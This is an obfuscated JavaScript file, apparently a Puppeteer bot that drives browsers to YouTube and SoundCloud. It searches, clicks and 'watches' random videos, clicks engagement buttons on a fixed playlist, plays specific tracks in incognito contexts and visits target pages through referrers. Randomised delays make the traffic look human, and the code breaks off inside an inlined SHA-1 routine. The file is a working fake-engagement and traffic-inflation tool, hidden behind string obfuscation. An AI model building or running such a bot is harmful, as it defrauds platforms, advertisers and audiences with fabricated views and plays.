const a6 = d,
  a3 = b,
  a2 = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x11cf + 0xc9e + -0x10a * -0x5))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2 * 0xa2a + 0x97 * 0x3b + 0xc3 * -0x13), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xdec3 + -0xcd48 + -0x63b5 * -0x1 + (-0x3d63 + 0x3a37 + 0x3dc4) * random()) : await standardWaitForNetIdle(f), await wait(-0x1a17 + 0x378 + 0x2a27 + (0x1c84 * 0x2 + -0x3 * 0x903 + -0x911 * -0x1) * random()), 0x22d * -0x5 + -0x675 + 0x1157;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2 * 0x1019 + 0xe * -0x26b + 0x1530), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x687 * 0x5 + -0x25b5 + -0x1d * -0x26d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1f2a + -0x226a + -0xaee * -0x6);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(-0x831 + 0x1 * 0xe35 + 0xd84 + (0x3e8 * -0x3 + -0x90d * -0x3 + 0x419 * 0x1) * random()), 0x5 * 0x19f + -0x25 * 0x85 + 0x49 * 0x27;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x21f0 + 0x76 + -0x1133 * 0x2, 0x78 * -0x10 + -0x2c * 0x2c + 0xf17 * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xcabc + -0x2 * 0xdae3 + 0x1d56a) * getRandomInt(-0x3 * -0x34b + 0xf98 + -0x3 * 0x87d, 0x80a + 0x10 * 0x1d1 + 0xb * -0x35f), h)), -0x1f8c + -0x1 * -0x1b6f + 0x1f * 0x22;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x17 * 0x7 + 0x25bc + -0x265d;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1c7f + -0x62 * 0x3b + -0x5e8]['split']('\x20');
    for (let k = -0x6a7 + 0x493 * 0x5 + -0x1038; k < i['length']; k += -0x4c4 * -0x6 + -0x8ef + -0x13a7)
      j += i[k] * h[i[k + (-0x63a + -0x63f * -0x2 + -0x643)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f[R(0xc)]('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      S = b,
      j = Array[S(0x16, 'Un1^')](document['querySelec' + T(0x6)]('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x97e + 0xd * -0x2ff + 0x1d7b)['map'](l => Array['from'](l['children']))['flat'](-0x2111 + -0x1 * -0x15b6 + 0xb5c)['map'](l => l['childNodes'][-0x1882 + 0x1 * -0x1b0d + 0x3390]['childNodes'][-0x1a * 0x46 + 0x431 * 0x9 + -0x1e9d]['childNodes'][0x4e0 + 0x610 * -0x2 + 0x741]['childNodes'][-0x2523 + -0x251 + 0xa * 0x3f2]['childNodes'][0x3 * 0xbcc + -0x1322 + -0x1041]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * 0x16b3 + -0x1b26 + 0x85b, 0x18d1 + 0x1 * -0x24cd + 0x1f84)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x22d * -0x1c + 0x221 * -0x2f + 0x61bb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x41 * 0x32 + 0x7990 + -0x46 * -0x1cb) * getRandomInt(-0x1 * 0xa89 + -0xf1a + -0x19a5 * -0x1, -0xf8c + 0x20b6 + -0x1125), h);
  return await wait(i), -0x1b9 * -0x13 + -0xdc + -0x1 * 0x1fde;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1f2a + -0x226a + -0xaee * -0x6);
    let h = e[f];
    if (c['mjclLB'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1bf7 + 0x1bfa + 0x3 * -0x1, r, s, t = 0x9 * 0x171 + -0x1b16 + 0xe1d; s = m['charAt'](t++); ~s && (r = q % (-0x11cf + 0xc9e + -0x535 * -0x1) ? r * (-0x2 * 0xa2a + 0x97 * 0x3b + 0x14b * -0xb) + s : s, q++ % (0x2521 + -0x2237 + -0x2e6 * 0x1)) ? o += String['fromCharCode'](-0x1477 + 0x1368 + 0x20e & r >> (-(-0x1a17 + 0x378 + 0x16a1) * q & 0x1c84 * 0x1 + -0x1 * 0xd85 + -0xef9 * 0x1)) : 0x22d * -0x5 + -0x675 + 0x1156) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2 * 0x1019 + 0xe * -0x26b + 0x1a8, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x687 * 0x5 + -0x25b5 + -0x8 * -0x8cd))['slice'](-(-0x831 + 0x1 * 0xe35 + -0x602));
        }
        return decodeURIComponent(p);
      };
      c['OtcOBC'] = i, b = arguments, c['mjclLB'] = !![];
    }
    const j = e[0x3e8 * -0x3 + -0x90d * -0x3 + 0xf6f * -0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['OtcOBC'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  const U = b;
  return log('going\x20to\x20f' + 'ront\x20scree' + U(0x3, 'h)LH') + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1a7f * -0x1 + 0x239 + 0x1846]['children'][-0x52 * 0x59 + -0x802 + 0x2484]['children'][0x1 * 0x2641 + -0x35a + -0x22e7]['children'][0xb * 0x2dd + 0x23b * 0x9 + -0x3392]['children'][-0x238d * 0x1 + 0x559 * -0x7 + 0x615 * 0xc]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1ef2 + -0x4 * 0x189 + 0x2517;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1ca * -0x2 + -0x51c + 0x1ec + (-0x1 * 0x427 + 0x6a * -0x2b + 0x1627) * random()
  }), await wait(-0x193d + -0x1589 + 0x30ba + (-0x24d0 + -0x92 * 0x2e + 0x4038) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x210d + -0xa7 * -0x2 + 0x3 * -0xb73]['childNodes'][0x3a0 + 0x2f * -0x57 + 0xc5a]['childNodes'][0xc1a * 0x1 + 0x8 * 0x123 + -0x1531]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x5ad + -0x1 * 0x23ab + 0x295d]['childNodes'][0x19de + -0xa52 + -0xf8c]['childNodes'][0xe * 0x10b + 0x8a6 + -0x173e]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x178 * -0x17 + 0x1be3 + -0x3daa * 0x1),
          r = 0xef6 * -0x1 + -0x4a * -0x30 + 0x2 * 0x8b;
        for (let u = -0x1 * -0x527 + 0x1202 * 0x1 + -0x1729; u < q['length']; u += 0x1fa + -0x1977 + 0x191 * 0xf)
          r += q[u] * k[q[u + (0x1725 + 0x6f * -0x49 + 0x883)]];
        return r;
      }(n);
  });
  await wait((-0x1 * -0x8e3 + -0x2e9 + 0x1a4f * 0x2) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x4 * -0x5ba0 + -0x1 * 0x4723 + -0x3cfd) * getRandomInt(0x2414 + -0x3db + -0x2038, -0x6a0 + -0x1 * -0x1445 + 0x3 * -0x489), h + (-0x215 + 0xa * 0x1d5 + 0x34b));
  return await wait(i), 0x15 * 0x18b + 0xd92 + -0x2df8;
}
async function keyWatch(f) {
  const V = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x91b + -0x23fd + -0xba * -0x25), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + V(0x0) + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2f4 + -0x1 * 0xa65 + 0x1329 + (0x161a + -0x982 * -0x2 + 0x1 * -0x2536) * Math['random']());
    });
  }, -0x11c7 + 0x6d7 * -0x3 + 0x41a4);
  await wait(0x2a6ea + 0x4900d * 0x2 + -0x73324);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x6f99 + -0x10603 + 0x180ca) * getRandomInt(-0xf8 * -0xd + 0x151 * 0x1d + -0x32c1, -0x8 * 0x3d + -0x56 * -0x3c + -0x1227)), clearInterval(h), -0x258b + -0x24 * 0xd6 + 0x43a4;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x2 * -0x581 + -0x35b * 0x1 + 0x7a7 * -0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1fb9 + -0x221f + 0x267;
    await randomWait();
  }
  return 0xb1 * -0x1b + -0x20e4 + 0x1e * 0x1b8;
}

function fetchRandomSC() {
  const X = d,
    W = b;
  return Math['random']() <= 0x2285 + -0x1 * -0x1669 + -0x38ee + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x833 * -0x1 + -0x119d * -0x1 + -0x96a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + W(0x4, 'FHVh') + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + X(0x9) + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const a1 = d,
      Y = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x58 * 0x43 + -0x3a1 + 0x1aa9 + 0.3) {
      const j = await f['createInco' + Y(0x18, 'FHVh') + 'erContext'](),
        k = await j['newPage']();
      let l = -0x4af + -0x15c * 0xc + 0x7d * 0x2b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x146e * 0x6 + -0x1303b + 0x1656f + getRandomInt(-0x3171 + -0x6796 + 0xd39f, 0x452 + -0x2 * -0x46cf + -0x1cc0));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0x2593 + -0x15c6 * -0x1 + 0x24 * -0x1a6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2233 + 0xe * -0x295 + 0x4659;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1f6 + 0x7 * 0x1d + 0x12b, 0x1c6c + 0x1 * 0x119f + -0x2dd9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2446 + 0x3d1 * 0x1 + 0x2845 + floor((0x1 * 0xf75 + -0xbaf * 0x1 + 0x22) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x463696fc + -0x374e9266 + 0x7117fb6a),
          -0xf33b28 + -0x5 * -0x447b9 + 0x15dd48b,
          -0x3b63 + 0x270b + 0x9458,
          -0x1347 + 0x935 + 0xa92
        ], y = [
          0xb31 * -0x1 + -0x16f6 * -0x1 + -0xbad,
          0x541 * 0x1 + -0x164a + 0x1119,
          0x2dd + 0x2 * -0x27d + 0x225,
          -0x17b3 * -0x1 + -0x46c + -0x3 * 0x66d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x4e4 + 0x6 * -0x41f + -0x1 * -0x13d7)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xb91 + 0x1ab4 + -0xf23; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1197 + 0x6d1 + -0xc34 * 0x2) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x75 * -0x51 + -0x54e + 0x1fb7 * -0x1] = A[-0x1e3e + -0x11f5 + 0x7 * 0x6e5] = A[-0xed6 + -0x1 * 0x1b22 + 0x1 * 0x29f9] = A[-0x128 * 0x2 + -0x15 * -0x1b2 + -0x429 * 0x8] = A[-0x14f5 + -0x8 * -0x147 + 0xac * 0x10] = A[0x1421 * -0x1 + -0x1 * -0xcfe + 0x727] = A[0x3d5 + 0x55a * -0x3 + -0x1 * -0xc3e] = A[-0x98 * 0x31 + -0x1f2f + 0x2b * 0x167] = A[-0x2e * 0x5d + 0x1f0b * 0x1 + -0xe4e * 0x1] = A[-0x3a5 + 0x2f * 0x25 + 0x39 * -0xe] = A[-0x17 * -0x94 + 0x1 * -0xf07 + 0xe2 * 0x2] = A[-0xe95 + 0x7c6 * 0x1 + 0x6d9] = A[0x47f * 0x1 + 0x5a1 + 0xa15 * -0x1] = A[0x2 * -0x75a + 0xf92 + -0xd2] = A[0x1 * 0x350 + -0x1d7c + 0x1a39] = A[0x49b + 0xc7 * 0xd + 0x86 * -0x1c] = A[0x1 * -0x1925 + -0x1b9f + -0x34d3 * -0x1] = -0x1 * -0x824 + -0x164 + -0x6c0, this['blocks'] = A) : this['blocks'] = [
                -0xbf6 * 0x2 + -0xe2d * -0x1 + 0x9bf,
                0xd09 + -0x609 * 0x5 + 0x1124,
                -0xee9 + -0xde8 + 0x1cd1,
                0x2534 + -0x1 * -0x4ac + -0x29e0,
                -0x816 + -0x13f * -0x6 + -0x4 * -0x27,
                -0x260 + 0xfe * 0xb + 0x445 * -0x2,
                -0x35 * -0x89 + -0x1e11 + 0x1b4,
                -0x20a6 + 0x1bcd + 0x4d9,
                -0xcfb * -0x2 + -0x53 * -0xf + 0xd * -0x25f,
                -0x1 * -0x867 + -0x15c6 + 0xd5f,
                0x1 * 0x1192 + 0x8 * -0xc1 + -0xb8a,
                -0x1e2a + -0x15a2 + 0x4e * 0xaa,
                0xf08 + -0x15b2 * -0x1 + -0x24ba,
                0x3 * -0x5bb + -0x49f + 0x1 * 0x15d0,
                -0x6 * 0x55d + -0x1678 + 0x5 * 0xaee,
                0x2136 * -0x1 + 0x19 * -0x72 + 0x2c58,
                -0x154c + 0x14e8 + 0x64
              ], this['h0'] = 0x24 * -0x20e8960 + 0x3b5dc139 + 0x75f2b348, this['h1'] = -0x12cfde09 * -0x5 + -0x1c2e * -0x24cfb + 0x50e90c42, this['h2'] = 0xf8074613 + -0xb48c7098 + 0x55400783, this['h3'] = 0x15601fd * 0x13 + -0x3dea * -0x899 + -0xb44222b, this['h4'] = -0x146825c3 * -0xd + 0x1 * 0x1355574ef + -0x17acc7de6, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1837 + -0x896 + -0x137 * -0x1b, this['finalized'] = this['hashed'] = -0x11c7 + 0x54b + 0xc7c, this['first'] = -0x22d6 + 0x1c86 + 0x651;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2592 + 0xa2 * 0x2b + -0x40c8, O = J['length'] || -0x2 * 0x229 + 0x1566 + -0x1114, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x92 * -0x1 + 0x2f * -0x7b + 0x1603, P[0xcf + -0x1380 + -0xf * -0x13f] = this['block'], P[0x909 + -0x11 * -0x52 + -0xe6b] = P[-0x1 * -0x128f + 0x1a28 + -0x2cb6] = P[0x2 * 0x20e + 0xa52 + -0xe6c] = P[-0x21d5 + 0x97a * -0x2 + -0x1b4 * -0x1f] = P[0x3 * 0x427 + 0x1505 + -0x2176 * 0x1] = P[-0x1b5d + -0x133b * -0x1 + 0x827 * 0x1] = P[0x5 * -0x391 + -0x304 * -0x3 + 0x5 * 0x1c3] = P[0x19 * 0x127 + 0x2462 * -0x1 + 0x79a] = P[0x1 * -0x1416 + -0x783 * -0x2 + 0x28c * 0x2] = P[0x19d8 + 0x4d0 * -0x2 + -0x102f] = P[0x2395 + 0x25e5 + -0x4970] = P[-0x3a2 * -0x3 + -0xa65 * -0x1 + -0x1540] = P[0x85b + -0x510 + -0x33f] = P[-0xe3d * 0x2 + 0x8be + -0x3f5 * -0x5] = P[0x4d * 0x2e + 0x1c43 + -0x2a0b] = P[-0x1 * -0xd87 + 0xf9a * 0x1 + -0x1d12] = 0xd2 * -0x3 + 0x141b * 0x1 + -0x11a5 * 0x1), K) {
                    for (N = this['start']; M < O && N < 0x25b8 + 0x492 + -0x2a0a; ++M)
                      P[N >> 0x1 * 0x2047 + -0x1ff1 * -0x1 + -0x4036] |= J[M] << y[0x709 * 0x2 + -0x8 * 0x43b + -0x1 * -0x13c9 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1481 + 0xcec * -0x2 + 0x9 * 0x9f; ++M)
                      (L = J['charCodeAt'](M)) < 0x10 * -0x116 + 0x1d70 + -0xb90 ? P[N >> -0xc07 * -0x3 + 0x1beb * -0x1 + -0x12 * 0x74] |= L << y[0x270c + -0x878 * -0x4 + -0x48e9 & N++] : L < -0x1 * 0x1159 + -0x26 * 0xb2 + 0x33c5 ? (P[N >> 0x1b15 + 0x1c04 + 0x3 * -0x125d] |= (-0x12cf + 0xc1 * 0x17 + -0x2 * -0x11c | L >> 0x89f * -0x3 + -0x25b5 + 0x3f98) << y[-0x13f3 * -0x1 + -0x2 * 0xb50 + 0x2b0 & N++], P[N >> 0x1dbf * 0x1 + 0x1fad + -0x463 * 0xe] |= (0x25 * 0xf1 + 0xf2 * -0x25 + 0xa5 | 0x1 * -0xc67 + -0x218f + 0x2e35 & L) << y[0x2683 + 0x57e + -0x2bfe & N++]) : L < -0x15b77 + -0x1 * 0x72cb + 0x710b * 0x6 || L >= 0x3342 * -0x8 + 0x196da * -0x1 + 0xd * 0x5012 ? (P[N >> 0x16b9 + -0x107f + -0x638] |= (-0x13a * -0x1a + -0xb89 * -0x1 + -0x2a8d | L >> 0x1 * -0x1a89 + -0x438 + -0x1 * -0x1ecd) << y[-0xd92 + 0x136b * -0x1 + 0x160 * 0x18 & N++], P[N >> 0x8e4 + -0x173c + 0xe5a] |= (-0x229a * -0x1 + -0x65e * 0x3 + -0xf00 | L >> 0xd1 * 0x26 + -0x24d7 + 0x73 * 0xd & -0x1 * -0x29 + -0x1ed0 + 0x1ee6) << y[0x39a + -0x1f0d + 0x1b76 & N++], P[N >> -0x3a * -0x74 + 0x1ce6 + 0x6 * -0x932] |= (-0x9 * -0x3f8 + 0xe75 * -0x2 + -0x2 * 0x327 | -0x20e5 + -0xe6 * -0xc + 0x165c & L) << y[0x252d + -0x1460 + 0x10ca * -0x1 & N++]) : (L = 0x109d * -0x19 + 0x29 * 0x9fd + 0x105d0 + ((-0x21bf + -0x92 + 0x2650 & L) << 0x1 * -0x2545 + 0xa41 * 0x2 + 0x10cd | -0x1648 + 0x13cf + 0x678 & J['charCodeAt'](++M)), P[N >> -0x26 + -0x7 * -0x313 + -0x155d] |= (0xfc2 + -0x211 * -0xd + -0x3 * 0xde5 | L >> 0xcb5 + 0x1 * -0x13ab + 0x708) << y[0x3 * -0x11d + -0x137d + -0x16d7 * -0x1 & N++], P[N >> -0x1c * -0x50 + 0x151 * -0xa + -0x2 * -0x236] |= (0x1c4d + 0x727 * 0x4 + -0x3869 | L >> 0x18fa + 0x3c4 * -0x3 + 0x15d * -0xa & -0x16cc + -0x6 * -0x566 + -0x959 * 0x1) << y[0x5f9 * 0x1 + -0x2 * 0x11bd + -0xec2 * -0x2 & N++], P[N >> 0x4 * -0x296 + 0xe41 + -0x3e7] |= (-0x2040 + -0x1 * 0x695 + 0x2755 * 0x1 | L >> -0x147a + 0x2061 + -0xbe1 & 0x4f * 0x49 + -0x2a1 * 0x2 + -0x1 * 0x1106) << y[-0x7b4 * -0x4 + -0x1 * 0x115b + 0x6b9 * -0x2 & N++], P[N >> 0x192f + 0x7f9 * 0x4 + -0x3911] |= (-0x72e + -0x1a8 + 0x956 | 0x2304 + 0x6f5 * 0x1 + -0x29ba & L) << y[0xcd9 + -0x9 * 0x6b + 0x913 * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x435 + 0x4c * 0x44 + -0xfbb ? (this['block'] = P[0x786 + -0x5c * 0x1f + 0x3ae], this['start'] = N - (0x7f2 * -0x1 + -0x2437 + -0x1 * -0x2c69), this['hash'](), this['hashed'] = -0x203f + -0x170b + 0x374b) : this['start'] = N;
                }
                return this['bytes'] > -0x12225bd9f + -0x1837 * 0xc5cd1 + 0x34d814685 && (this['hBytes'] += this['bytes'] / (-0x12e801c40 + -0xc7f49178 + 0x2b * 0x11a37528) << -0x1e05 * -0x1 + -0xef9 * 0x1 + 0xd6 * -0x12, this['bytes'] = this['bytes'] % (0x2d93db70 + -0x11557eab8 + 0x618d9ca8 * 0x5)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xae5 + -0xc4c + 0x1732 * 0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xac9 + -0x25a9 + -0x4 * -0x6bc] = this['block'], J[K >> 0x1 * -0xef9 + 0x2434 + -0x1539] |= x[0x724 * -0x5 + 0x1 * -0x25bd + 0x4974 & K], this['block'] = J[-0x1c69 * -0x1 + -0xed5 * -0x2 + -0x3a03 * 0x1], K >= 0x12d * -0x3 + -0x1572 + -0x1 * -0x1931 && (this['hashed'] || this['hash'](), J[-0x35c + 0x47 * 0x13 + -0x1e9] = this['block'], J[-0x1bad * 0x1 + -0x83 * 0x16 + 0x26ff] = J[0x206 * -0x4 + 0xfaf + -0x796] = J[-0xbc5 + -0xaef + 0x13 * 0x132] = J[0xf5 + -0x3c * 0x4f + -0xd * -0x15a] = J[-0x96f + -0x18eb * -0x1 + -0xc6 * 0x14] = J[0x23fb + 0xb18 + -0x2f0e] = J[-0x2b7 * -0x7 + -0x107 * 0x9 + 0x4 * -0x26f] = J[-0x15a3 + 0x1cbb + 0x9 * -0xc9] = J[-0x134a + -0x5 * 0x11 + 0x13a7] = J[0x7 * -0x265 + -0x18fc + 0x539 * 0x8] = J[-0x1 * -0x1a87 + 0x2572 + -0x3fef] = J[0x96f * -0x3 + 0x407 * 0x2 + 0xa25 * 0x2] = J[-0x1fe5 + -0x9fd * 0x2 + 0x33eb] = J[-0x9 * -0x7a + 0x2b9 * -0x6 + 0xc19] = J[-0x232a + -0xfa * 0x3 + -0x13 * -0x202] = J[-0x20aa + 0x118c + -0x309 * -0x5] = 0xeb9 + -0x2 * -0x1002 + 0x959 * -0x5), J[-0x1 * -0x2493 + 0x256e + -0x6b9 * 0xb] = this['hBytes'] << -0x1b3c + -0x26d6 + 0x4215 | this['bytes'] >>> 0x5 * 0x1db + 0x24c0 + -0x2dea, J[-0x1db0 + 0x20a8 + -0x2e9] = this['bytes'] << -0x11 * 0xb5 + 0x1dd2 + -0x11ca, this['hash']();
              }
            }
            ['hash']() {
